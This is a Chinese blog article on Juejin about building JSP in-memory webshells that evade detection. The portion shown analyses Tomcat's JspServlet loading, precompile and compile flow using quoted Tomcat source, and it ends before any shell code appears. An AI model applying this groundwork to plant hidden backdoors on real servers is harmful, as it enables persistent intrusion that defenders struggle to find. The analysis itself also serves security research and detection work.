<!doctype html>
<html data-n-head-ssr lang="zh" data-n-head="%7B%22lang%22:%7B%22ssr%22:%22zh%22%7D%7D">
  <head >
    <title>【Web安全】JSP内存马研究 - 掘金</title><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover"><meta data-n-head="ssr" name="apple-itunes-app" content="app-id=987739104"><meta data-n-head="ssr" name="theme-color" content="#ffffff"><meta data-n-head="ssr" name="msapplication-TileColor" content="#da532c"><meta data-n-head="ssr" vmid="description" name="description" content="前言 最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的Servlet和Filter拿出来，排"><meta data-n-head="ssr" vmid="keywords" name="keywords" content="安全"><link data-n-head="ssr" rel="preconnect" href="//lf3-cdn-tos.bytescm.com" crossorigin="anonymous"><link data-n-head="ssr" rel="preconnect" href="//mcs.snssdk.com" crossorigin="anonymous"><link data-n-head="ssr" rel="preconnect" href="//i.snssdk.com" crossorigin="anonymous"><link data-n-head="ssr" rel="dns-prefetch" href="//lf3-cdn-tos.bytescm.com"><link data-n-head="ssr" rel="dns-prefetch" href="//api.juejin.cn"><link data-n-head="ssr" rel="dns-prefetch" href="//lf-cdn-tos.bytescm.com"><link data-n-head="ssr" rel="dns-prefetch" href="//unpkg.byted-static.com"><link data-n-head="ssr" rel="dns-prefetch" href="//p1-juejin.byteimg.com"><link data-n-head="ssr" rel="dns-prefetch" href="//p3-juejin.byteimg.com"><link data-n-head="ssr" rel="dns-prefetch" href="//p6-juejin.byteimg.com"><link data-n-head="ssr" rel="dns-prefetch" href="//p9-juejin.byteimg.com"><link data-n-head="ssr" rel="dns-prefetch" href="//p1-jj.byteimg.com"><link data-n-head="ssr" rel="dns-prefetch" href="//mcs.snssdk.com"><link data-n-head="ssr" rel="dns-prefetch" href="//i.snssdk.com"><link data-n-head="ssr" rel="apple-touch-icon" sizes="180x180" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/apple-touch-icon.png"><link data-n-head="ssr" rel="icon" type="image/png" sizes="32x32" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/favicon-32x32.png"><link data-n-head="ssr" rel="icon" type="image/png" sizes="16x16" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/favicon-16x16.png"><link data-n-head="ssr" rel="mask-icon" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/safari-pinned-tab.svg" color="#1E80FF"><link data-n-head="ssr" rel="manifest" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/site.webmanifest"><link data-n-head="ssr" rel="search" title="掘金" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/search.xml" type="application/opensearchdescription+xml"><link data-n-head="ssr" rel="stylesheet" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/ionicons/css/ionicons.min.css"><link data-n-head="ssr" rel="stylesheet" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/iconfont/index.css"><link data-n-head="ssr" rel="stylesheet" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/ionicons/iconfont.css"><link data-n-head="ssr" rel="stylesheet" href="https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/bytedesign.min.css"><link data-n-head="ssr" rel="canonical" href="https://juejin.cn/post/7020701580210995230"><script data-n-head="ssr" type="text/javascript" src="https://lf3-cdn-tos.bytescm.com/obj/rc-web-sdk/acrawler.js"></script><script data-n-head="ssr" type="application/ld+json">[{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://juejin.cn/post/7020701580210995230"},"headline":"【Web安全】JSP内存马研究","description":"前言 最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的Servlet和Filter拿出来，排","image":[],"author":{"@type":"Organization","name":"安全白板"},"publisher":{"@type":"Organization","name":"掘金","logo":{"@type":"ImageObject","url":"//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg"}},"datePublished":"2021年10月19日","dateModified":"2021年10月19日"},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","name":"稀土掘金","position":1,"item":"https://juejin.cn"},{"@type":"ListItem","name":"代码人生","position":2,"item":"https://juejin.cn/career"},{"@type":"ListItem","name":"文章","position":3}]}]</script><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/2a06dad.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/6529f6e.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/2372901.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/app.89b9488.css" as="style"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/3aa8109.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/layouts/default.2050f18.css" as="style"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/e3da178.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/51.8344ef6.css" as="style"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/4deffbb.js" as="script"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/198.3d69a3b.css" as="style"><link rel="preload" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/77c8c0a.js" as="script"><link rel="stylesheet" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/app.89b9488.css"><link rel="stylesheet" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/layouts/default.2050f18.css"><link rel="stylesheet" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/51.8344ef6.css"><link rel="stylesheet" href="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/198.3d69a3b.css">
  </head>
  <body >
    <div data-server-rendered="true" id="__nuxt"><div id="__layout"><div id="juejin"><!----> <div class="view-container" data-v-4b9f9746 data-v-020666e8><div class="main-header-box" data-v-4b9f9746><header visible="visible" data-fetch-key="0" class="main-header main-header unauthorized visible" data-v-62a2b6bf data-v-4b9f9746><div class="container" data-v-62a2b6bf><a href="/" class="logo" data-v-62a2b6bf><img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg" alt="稀土掘金" class="logo-img" data-v-62a2b6bf> <img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/6c61ae65d1c41ae8221a670fa32d05aa.svg" alt="稀土掘金" class="mobile" data-v-62a2b6bf></a> <!----> <!----> <nav role="navigation" class="main-nav" data-v-62a2b6bf><ul class="nav-list" data-v-62a2b6bf><!----> <li class="main-nav-list" data-v-62a2b6bf><div class="phone-show-menu isResourceVisible" data-v-62a2b6bf><span data-v-62a2b6bf>首页</span> <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="unfold16-icon" data-v-62a2b6bf data-v-62a2b6bf><path d="M2.45025 4.82431C2.17422 4.49957 2.40501 4.00049 2.83122 4.00049H9.16878C9.59498 4.00049 9.82578 4.49957 9.54975 4.82431L6.38097 8.55229C6.1813 8.78719 5.8187 8.78719 5.61903 8.55229L2.45025 4.82431Z" data-v-62a2b6bf data-v-62a2b6bf></path></svg></div> <ul class="phone-hide isResourceVisible" data-v-62a2b6bf><li class="nav-item link-item route-active" data-v-62a2b6bf><a href="/" data-v-62a2b6bf>首页</a></li> <li class="nav-item link-item activities" data-v-62a2b6bf><a href="/pins" data-v-62a2b6bf><span class="text" data-v-62a2b6bf>
                  沸点
                  <!----></span></a></li> <li class="nav-item link-item book" data-v-62a2b6bf><a href="/course" data-v-62a2b6bf>
                课程
                <!----></a></li> <li class="nav-item link-item" data-v-62a2b6bf><a href="/live" data-v-62a2b6bf>直播</a></li> <li class="nav-item link-item" data-v-62a2b6bf><a href="/events/all" data-v-62a2b6bf>活动</a></li> <nav class="nav-item link-item" data-v-62a2b6bf><a href="https://detail.youzan.com/show/goods/newest?kdt_id=104340304" target="_blank" rel="nofollow noopener noreferrer" class="nav-item link-item no-border" data-v-62a2b6bf><span data-v-62a2b6bf>商城</span></a> <!----></nav> <nav class="nav-item link-item download-icon isResourceVisible" data-v-62a2b6bf><a href="/app?utm_source=jj_nav" target="_blank" class="download-app no-border" data-v-62a2b6bf>
                APP
              </a> <!----></nav> <nav class="nav-item link-item extension-icon" data-v-62a2b6bf><a href="https://juejin.cn/extension?utm_source=jj_nav" target="_blank" rel="nofollow noopener noreferrer" class="broswer-extension no-border isResourceVisible" data-v-62a2b6bf><span data-v-62a2b6bf>插件</span></a></nav> <li tag="li" class="nav-item link-item" data-v-62a2b6bf><a target="_blank" href="https://juejin.cn/challenge/1?utm_source=web_nav" class="activity no-hover special-activity" data-v-62a2b6bf><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/759e2aa805c0461b840e0f0f09ed05fa~tplv-k3u1fbpfcp-zoom-1.image?" style="max-width: 115px; vertical-align: middle" data-v-62a2b6bf></a></li></ul></li> <ul class="right-side-nav" data-v-62a2b6bf><li class="search-add" data-v-62a2b6bf><ul class="search-add-ul isResourceVisible" data-v-62a2b6bf><li class="nav-item search" data-v-62a2b6bf><form role="search" class="search-form isResourceVisible" data-v-62a2b6bf><input type="search" maxlength="32" placeholder="" value="" class="search-input isResourceVisible" data-v-62a2b6bf> <div class="seach-icon-container" data-v-62a2b6bf><img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/1e8ab9a22f0ddc36349f60b38900d0bd.svg" alt="搜索" class="search-icon" data-v-62a2b6bf></div> <div class="typehead" style="display:none;" data-v-62a2b6bf><!----> <div class="title" data-v-62a2b6bf><span data-v-62a2b6bf>搜索历史</span> <span class="clear" data-v-62a2b6bf>
                        清空
                      </span></div> <div class="list" data-v-62a2b6bf></div></div></form></li> <li class="nav-item add creator-item" data-v-62a2b6bf><div class="add-group" data-v-3a3133c9 data-v-62a2b6bf><!----> <button class="add-btn" data-v-3a3133c9>
    创作者中心
  </button> <div class="more" data-v-3a3133c9><svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="unfold12-icon" data-v-3a3133c9 data-v-3a3133c9><path d="M2.45025 4.82383C2.17422 4.49908 2.40501 4 2.83122 4H9.16878C9.59499 4 9.82578 4.49908 9.54975 4.82382L6.38097 8.5518C6.1813 8.7867 5.8187 8.7867 5.61903 8.5518L2.45025 4.82383Z" fill="white" data-v-3a3133c9 data-v-3a3133c9></path></svg></div> <ul class="more-list" data-v-3a3133c9><li class="item" data-v-3a3133c9><span class="icon write-article" data-v-3a3133c9>写文章</span></li><li class="item" data-v-3a3133c9><span class="icon issue-points" data-v-3a3133c9>发沸点</span></li><li class="item" data-v-3a3133c9><span class="icon write-note" data-v-3a3133c9>写笔记</span></li><li class="item" data-v-3a3133c9><span class="icon create-jcode" data-v-3a3133c9>写代码</span></li><li class="item" data-v-3a3133c9><span class="icon drafts" data-v-3a3133c9>草稿箱</span></li></ul> <!----> <!----></div></li></ul></li> <!----> <li class="nav-item vip-entry" data-v-62a2b6bf><div class="vip-title" data-v-62a2b6bf><img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/24127194d5b158d7eaf8f09a256c5d01.svg" alt="vip" class="vip-img" data-v-62a2b6bf> <div class="vip-words" data-v-62a2b6bf>会员</div></div> <div class="vip-content" style="display:none;" data-v-62a2b6bf><img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/a0ef799e93fdbfcffe8553ecf2beb5ba.svg" alt="doll" class="icon" data-v-62a2b6bf> <div class="content" data-v-62a2b6bf><span data-v-62a2b6bf>掘金会员，新权益到账啦~!</span> <span data-v-62a2b6bf>字节内部课程，VIP免费学习</span></div> <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="close" data-v-62a2b6bf data-v-62a2b6bf><path d="M14.3029 3.69629L8.99959 8.99957L3.69629 14.3029" stroke="#8A919F" stroke-width="1.5" stroke-linecap="round" data-v-62a2b6bf data-v-62a2b6bf></path><path d="M3.69629 3.69629L8.99959 8.99957L14.3029 14.3029" stroke="#8A919F" stroke-width="1.5" stroke-linecap="round" data-v-62a2b6bf data-v-62a2b6bf></path></svg> <img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/fef2eb8d28949cc43248bad54cb1579a.svg" class="mask" data-v-62a2b6bf></div></li> <!----> <!----> <li class="nav-item auth" data-v-62a2b6bf><div class="login-button-wrap" data-v-62a2b6bf><button class="login-button" data-v-62a2b6bf>
                登录
                <!----></button> <!----></div></li></ul></ul></nav></div> <!----></header></div>  <main class="container main-container" style="max-width:1140px;" data-v-4b9f9746><div class="view column-view" data-v-4b9f9746 data-v-020666e8><div class="main-area article-area" data-v-4b9f9746 data-v-020666e8><article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7020701580210995230" data-draft-id="7020701466918682631" data-original-type="0" class="article" data-v-020666e8><!----> <meta itemprop="headline" content="【Web安全】JSP内存马研究"> <meta itemprop="keywords" content="安全"> <meta itemprop="datePublished" content="2021-10-19T09:08:36.000Z"> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="安全白板"> <meta itemprop="url" content="https://juejin.cn/user/3096695179321544"></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"> <meta itemprop="width" content="180"> <meta itemprop="height" content="180"></div></div> <h1 class="article-title" data-v-020666e8>
            【Web安全】JSP内存马研究
            <!----></h1> <div class="author-info-block" data-v-020666e8><a href="/user/3096695179321544" target="_blank" rel="" class="avatar-link" data-v-020666e8><img loading="eager" src="https://p3-passport.byteimg.com/img/user-avatar/5b4fe90aaf79de49689ec22ea8e27561~100x100.image" alt="" class="lazy avatar avatar" data-v-248050e4 data-v-47508ed8 data-v-020666e8></a> <div class="author-info-box" data-v-020666e8><div class="author-name" data-v-020666e8><a href="/user/3096695179321544" target="_blank" rel="" class="username username ellipsis" data-v-0ef8bafa data-v-020666e8><span class="name" style="max-width:128px;" data-v-0ef8bafa>
    安全白板
  </span> <span blank="true" class="rank" data-v-3de16c56 data-v-0ef8bafa><img src="//lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web/img/lv-5.d08789d.png" alt="lv-5" title="创作等级" data-v-3de16c56></span> <!----> <!----> </a> <!----></div> <div class="meta-box" data-v-020666e8><time datetime="2021-10-19T09:08:36.000Z" title="Tue Oct 19 2021 17:08:36 GMT+0800 (China Standard Time)" class="time" data-v-020666e8>
                    2021年10月19日 17:08
                  </time> <span class="views-count" data-v-020666e8>
                    ·  阅读 797
                  </span> <!----></div> <!----></div> <button class="follow-button follow" data-v-565dd611 data-v-020666e8><span class="icon icon-follow" data-v-565dd611></span> <span data-text="取消关注" class="text" data-v-565dd611>关注</span></button></div> <!----> <!----> <!----> <div itemprop="articleBody" class="article-content" data-v-020666e8><div class="markdown-body cache"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;margin-bottom:5px}.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{font-size:20px}.markdown-body h2{padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre>code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote>p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><h2 data-id="heading-0"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8e050c964e6f47938121ce8f3cd5039c~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image" alt="" loading="lazy"></h2>
<h2 data-id="heading-1">前言</h2>
<p>最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的<code>Servlet</code>和<code>Filter</code>拿出来，排查人员仔细一点还是会被查出来的，所以<br>
<strong>我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马（虽然本质上也是一种Servlet类型的马）</strong>  。</p>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fdocs.qq.com%252Fdoc%252FDVFNpaGJvRFJiQ2Ro" target="_blank" rel="nofollow noopener noreferrer" title="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVFNpaGJvRFJiQ2Ro" ref="nofollow noopener noreferrer">【学习资料】</a></h2>
<h2 data-id="heading-3">JSP加载流程分析</h2>
<p>在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
<pre><code class="hljs language-xml copyable" lang="xml"><span class="hljs-tag">&#x3C;<span class="hljs-name">servlet</span>></span>
        <span class="hljs-tag">&#x3C;<span class="hljs-name">servlet-name</span>></span>jsp<span class="hljs-tag">&#x3C;/<span class="hljs-name">servlet-name</span>></span>
        <span class="hljs-tag">&#x3C;<span class="hljs-name">servlet-class</span>></span>org.apache.jasper.servlet.JspServlet<span class="hljs-tag">&#x3C;/<span class="hljs-name">servlet-class</span>></span>
    ...
    <span class="hljs-tag">&#x3C;/<span class="hljs-name">servlet</span>></span>
...
<span class="hljs-tag">&#x3C;<span class="hljs-name">servlet-mapping</span>></span>
        <span class="hljs-tag">&#x3C;<span class="hljs-name">servlet-name</span>></span>jsp<span class="hljs-tag">&#x3C;/<span class="hljs-name">servlet-name</span>></span>
        <span class="hljs-tag">&#x3C;<span class="hljs-name">url-pattern</span>></span>*.jsp<span class="hljs-tag">&#x3C;/<span class="hljs-name">url-pattern</span>></span>
        <span class="hljs-tag">&#x3C;<span class="hljs-name">url-pattern</span>></span>*.jspx<span class="hljs-tag">&#x3C;/<span class="hljs-name">url-pattern</span>></span>
    <span class="hljs-tag">&#x3C;/<span class="hljs-name">servlet-mapping</span>></span>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面分析<code>JspServlet#service</code>方法，主要的功能是接收请求的URL，判断是否预编译，核心的方法是<code>serviceJspFile</code>。</p>
<pre><code class="hljs language-ini copyable" lang="ini">public void service (HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String <span class="hljs-attr">jspUri</span> = jspFile<span class="hljs-comment">;</span>
            <span class="hljs-attr">jspUri</span> = (String) request.getAttribute(
                    RequestDispatcher.INCLUDE_SERVLET_PATH)<span class="hljs-comment">;</span>
            if (jspUri != null) {
      //检查请求是否是通过其他Servlet转发过来的
                String <span class="hljs-attr">pathInfo</span> = (String) request.getAttribute(
                        RequestDispatcher.INCLUDE_PATH_INFO)<span class="hljs-comment">;</span>
                if (pathInfo != null) {
                    jspUri += pathInfo<span class="hljs-comment">;</span>
                }
            } else {
       //获取ServletPath和pathInfo作为jspUri
                <span class="hljs-attr">jspUri</span> = request.getServletPath()<span class="hljs-comment">;</span>
                String <span class="hljs-attr">pathInfo</span> = request.getPathInfo()<span class="hljs-comment">;</span>
                if (pathInfo != null) {
                    jspUri += pathInfo<span class="hljs-comment">;</span>
                }
            }
        }
        try {
            //是否预编译
            boolean <span class="hljs-attr">precompile</span> = preCompile(request)<span class="hljs-comment">;</span>
            //核心方法
            serviceJspFile(request, response, jspUri, precompile)<span class="hljs-comment">;</span>
        } catch (RuntimeException | IOException | ServletException e) {
            throw e<span class="hljs-comment">;</span>
        } catch (Throwable e) {
            ExceptionUtils.handleThrowable(e)<span class="hljs-comment">;</span>
            throw new ServletException(e)<span class="hljs-comment">;</span>
        }
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>preCompile</code>中只有当请求参数以<code>jsp_precompile</code>开始才会进行预编译，否则不进行预编译。</p>
<pre><code class="hljs language-java copyable" lang="java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">preCompile</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> ServletException {
        <span class="hljs-type">String</span> <span class="hljs-variable">queryString</span> <span class="hljs-operator">=</span> request.getQueryString();
        <span class="hljs-keyword">if</span> (queryString == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-comment">//    public static final String PRECOMPILE = System.getProperty("org.apache.jasper.Constants.PRECOMPILE", "jsp_precompile");</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> queryString.indexOf(Constants.PRECOMPILE);
        <span class="hljs-keyword">if</span> (start &#x3C; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        queryString =
            queryString.substring(start + Constants.PRECOMPILE.length());
        <span class="hljs-keyword">if</span> (queryString.length() == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;             <span class="hljs-comment">// ?jsp_precompile</span>
        }
        <span class="hljs-keyword">if</span> (queryString.startsWith(<span class="hljs-string">"&#x26;"</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;             <span class="hljs-comment">// ?jsp_precompile&#x26;foo=bar...</span>
        }
        <span class="hljs-keyword">if</span> (!queryString.startsWith(<span class="hljs-string">"="</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            <span class="hljs-comment">// part of some other name or value</span>
        }
       ...
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>那么预编译的作用是什么？当进行预编译后会怎么样？答案在<code>JspServletWrapper#service</code>中，当预编译后，请求便不会调用对应JSP的servlet的service方法进行处理，所以要想让我们的JSP能正常使用，当然是不要预编译的，默认情况下也不会预编译。</p>
<pre><code class="hljs language-java copyable" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest request,
                        HttpServletResponse response,
                        <span class="hljs-type">boolean</span> precompile)</span>
            <span class="hljs-keyword">throws</span> ServletException, IOException, FileNotFoundException {
        Servlet servlet;
      ...

            <span class="hljs-comment">// If a page is to be precompiled only, return.</span>
            <span class="hljs-keyword">if</span> (precompile) {
                <span class="hljs-keyword">return</span>;
     ...
            <span class="hljs-comment">/*
             * (4) Service request
             */</span>
            <span class="hljs-keyword">if</span> (servlet <span class="hljs-keyword">instanceof</span> SingleThreadModel) {
               <span class="hljs-comment">// sync on the wrapper so that the freshness</span>
               <span class="hljs-comment">// of the page is determined right before servicing</span>
               <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
                   ``.service(request, response);
                }
            } <span class="hljs-keyword">else</span> {
                servlet.service(request, response);
            }
      ...
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面再来看<code>serviceJspFile</code>方法，该方法判断JSP是否已经被注册为一个Servlet，不存在则创建JspServletWrapper并put到<code>JspRuntimeContext</code>中，<code>JspServletWrapper.service</code>是核心方法。</p>
<pre><code class="hljs language-scss copyable" lang="scss">private void <span class="hljs-built_in">serviceJspFile</span>(HttpServletRequest request,
                                HttpServletResponse response, String jspUri,
                                boolean precompile)
        throws ServletException, IOException {
<span class="hljs-comment">//  首先判断JSP是否已经被注册为一个Servlet，ServletWrapper是Servlet的包装类，所有注册的JSP servlet都会被保存在JspRuntimeContext的jsps属性中，如果我们第一次请求这个JSP，当然是找不到wrapper的。</span>
        JspServletWrapper wrapper = rctxt<span class="hljs-selector-class">.getWrapper</span>(jspUri);
        if (wrapper == null) {
            <span class="hljs-built_in">synchronized</span>(this) {
                wrapper = rctxt<span class="hljs-selector-class">.getWrapper</span>(jspUri);
                if (wrapper == null) {
                 <span class="hljs-comment">//检查JSP文件是否存在</span>
                    if (null == context.getResource(jspUri)) {
                        <span class="hljs-built_in">handleMissingResource</span>(request, response, jspUri);
                        return;
                    }
                    <span class="hljs-comment">//创建JspServletWrapper</span>
                    wrapper = new <span class="hljs-built_in">JspServletWrapper</span>(config, options, jspUri,
                                                 rctxt);
                    <span class="hljs-comment">//添加wrapper到JspRuntimeContext的jsps属性中</span>
                    rctxt<span class="hljs-selector-class">.addWrapper</span>(jspUri,wrapper);
                }
            }
        }
        try {
            <span class="hljs-comment">//核心方法</span>
            wrapper<span class="hljs-selector-class">.service</span>(request, response, precompile);
        } catch (FileNotFoundException fnfe) {
            <span class="hljs-built_in">handleMissingResource</span>(request, response, jspUri);
        }
    }
<span class="copy-code-btn">复制代码</span></code></pre>
<p><code>JspServletWrapper.service</code>主要做了如下操作。</p>
<ul>
<li>
<p>根据jsp生成java文件并编译为class</p>
</li>
<li>
<p>将class文件注册为servlet</p>
</li>
<li>
<p>调用<code>servlet.service</code>方法完成调用</p>
</li>
</ul>
<p>JSP生成java和class文件主要由下面的代码完成，这里的<code>options.getDevelopment()</code>代表的是部署模式。</p>
<p>tomcat的开发模式和生产模式的设定是通过conf文件夹下面的web.xml文件来配置的。</p>
<blockquote>
<p>在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要。</p>
</blockquote>
<p>默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由<code>JspCompilationContext#compile</code>进行编译。</p>
<pre><code class="hljs language-java copyable" lang="java"><span class="hljs-keyword">if</span> (options.getDevelopment() || mustCompile) {
                <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
                    <span class="hljs-keyword">if</span> (options.getDevelopment() || mustCompile) {
                        ctxt.compile();
                        mustCompile = <span class="hljs-literal">false</span>;
                    }
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">if</span> (compileException != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// Throw cached compilation exception</span>
                    <span class="hljs-keyword">throw</span> compileException;
                }
            }
<span class="copy-code-btn">复制代码</span></code></pre>
<p>下面我们看下编译部分都做了什么，Tomcat默认使用<code>JDTCompiler</code>编译，首先通过<code>isOutDated</code>判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过<code>jspCompiler.compile()</code>编译。</p>
